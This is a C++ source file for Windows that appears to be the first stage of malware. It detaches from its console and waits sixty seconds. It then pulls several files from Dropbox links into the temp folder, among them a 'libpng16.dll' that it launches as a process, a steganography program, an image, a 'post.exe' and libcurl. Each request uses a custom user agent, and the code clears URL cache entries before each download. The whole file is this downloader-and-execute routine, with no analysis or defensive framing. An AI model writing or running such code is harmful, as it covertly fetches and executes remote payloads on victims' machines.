#include <windows.h>
#include <shlwapi.h>
#include <iostream>
#include <fstream>
#include <wininet.h>


int main(int argc, char* argv[]) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	FreeConsole();
	WCHAR temppath[262];
	WCHAR filepath[264];
	Sleep(60000);
	GetTempPathW(0x104, temppath);
	PathCombineW(filepath, temppath, (LPCWSTR)u"libpng16.dll");
	memset(&si, 0, 0x68);
	si.cb = 0x68;
	DeleteUrlCacheEntryW(L"https://www.dropbox.com/s/yfyl763sy2guhkl/libpng16.dll?dl=1");
	UrlMkSetSessionOption(URLMON_OPTION_USERAGENT, (LPVOID)"ch0nky", 7, 0);
	if (URLDownloadToFileW(0,
		L"https://www.dropbox.com/s/yfyl763sy2guhkl/libpng16.dll?dl=1", filepath, 0
	, 0) > -1) {
		if (CreateProcessW((LPCWSTR)0x0, filepath, (LPSECURITY_ATTRIBUTES)0x0,
			(LPSECURITY_ATTRIBUTES)0x0, 0, 0, (LPVOID)0x0, (LPCWSTR)0x0, (LPSTARTUPINFOW)&si,
			&pi) == 0) {
			CloseHandle(pi.hProcess);
		}
	}
	PathCombineW(filepath, temppath, (LPCWSTR)u"Steganography.exe");
	DeleteUrlCacheEntryW(L"https://www.dropbox.com/s/5fdcpqzyiz9ml7e/Steganography.exe?dl=1");
	UrlMkSetSessionOption(URLMON_OPTION_USERAGENT, (LPVOID)"ch0nky", 7, 0);
	if (URLDownloadToFileW(0,
		L"https://www.dropbox.com/s/5fdcpqzyiz9ml7e/Steganography.exe?dl=1", filepath, 0
		, 0) > -1) {
	}
	PathCombineW(filepath, temppath, (LPCWSTR)u"doge.png");
	DeleteUrlCacheEntryW(L"https://www.dropbox.com/s/2oy3z8g1nb0scv4/doge.png?dl=1");
	UrlMkSetSessionOption(URLMON_OPTION_USERAGENT, (LPVOID)"ch0nky", 7, 0);
	if (URLDownloadToFileW(0,
		L"https://www.dropbox.com/s/2oy3z8g1nb0scv4/doge.png?dl=1", filepath, 0
		, 0) > -1) {
	}
	PathCombineW(filepath, temppath, (LPCWSTR)u"post.exe");
	DeleteUrlCacheEntryW(L"https://www.dropbox.com/s/aiib97o4pxrti6t/post.exe?dl=1");
	UrlMkSetSessionOption(URLMON_OPTION_USERAGENT, (LPVOID)"ch0nky", 7, 0);
	if (URLDownloadToFileW(0,
		L"https://www.dropbox.com/s/aiib97o4pxrti6t/post.exe?dl=1", filepath, 0
		, 0) > -1) {
	}
	PathCombineW(filepath, temppath, (LPCWSTR)u"libcurl.dll");
	DeleteUrlCacheEntryW(L"https://www.dropbox.com/s/6w64bb8g1zixeav/libcurl.dll?dl=1");
	UrlMkSetSessionOption(URLMON_OPTION_USERAGENT, (LPVOID)"ch0nky", 7, 0);
	if (URLDownloadToFileW(0,
		L"https://www.dropbox.com/s/6w64bb8g1zixeav/libcurl.dll?dl=1", filepath, 0
		, 0) > -1) {
	}


	return 0;
}
